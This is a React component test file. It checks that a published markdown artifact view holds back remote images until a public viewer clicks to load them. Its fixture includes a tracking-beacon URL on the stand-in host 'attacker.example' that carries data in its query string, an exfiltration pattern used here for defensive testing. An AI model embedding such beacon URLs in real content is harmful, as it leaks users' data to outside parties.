import type React from 'react';
import { describe, expect, it, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

type ReactI18nextModule = typeof import('react-i18next');

vi.mock('next/navigation', () => ({ useRouter: () => ({ push: vi.fn() }) }));

vi.mock('react-i18next', async (importOriginal) => ({
  ...(await importOriginal<ReactI18nextModule>()),
  useTranslation: () => ({ t: (key: string, fallback?: string) => fallback ?? key }),
}));

vi.mock('@/features/chat/components/SandboxedIframe', () => ({
  SandboxedIframe: () => <div data-testid="sandboxed-frame" />,
}));

vi.mock('next/link', () => ({
  default: ({
    children,
    href,
    className,
  }: {
    children: React.ReactNode;
    href: string;
    className?: string;
  }) => (
    <a href={href} className={className}>
      {children}
    </a>
  ),
}));

vi.mock('@/lib/identity/client', () => ({
  useSession: () => ({
    isLoaded: true,
    isSignedIn: false,
    userId: null,
    getToken: async () => null,
  }),
}));

const { PublishedArtifactView } = await import('./PublishedArtifactView');

const ATTACKER_HOST = 'attacker.example';
const BEACON_URL = `https://${ATTACKER_HOST}/viewer.png?d=what-the-author-asked`;
const PNG_DATA_URL = 'data:image/png;base64,iVBORw0KGgo=';

describe('PublishedArtifactView images', () => {
  it('asks a public viewer before loading an image the artifact points at', async () => {
    const user = userEvent.setup();
    const { container } = render(
      <PublishedArtifactView
        title="Shared notes"
        kind="markdown"
        language={null}
        publishedAt="2026-10-01T00:00:00.000Z"
        content={`# Notes\n\n![diagram](${PNG_DATA_URL})\n\n![tracker](${BEACON_URL})`}
      />,
    );

    expect(
      [...container.querySelectorAll('img')].map((image) => image.getAttribute('src')),
    ).toEqual([PNG_DATA_URL]);
    expect(container.innerHTML).not.toContain(`${ATTACKER_HOST}/viewer.png`);

    await user.click(screen.getByRole('button', { name: `Load image from ${ATTACKER_HOST}` }));

    expect(
      [...container.querySelectorAll('img')].map((image) => image.getAttribute('src')),
    ).toEqual([PNG_DATA_URL, BEACON_URL]);
  });
});
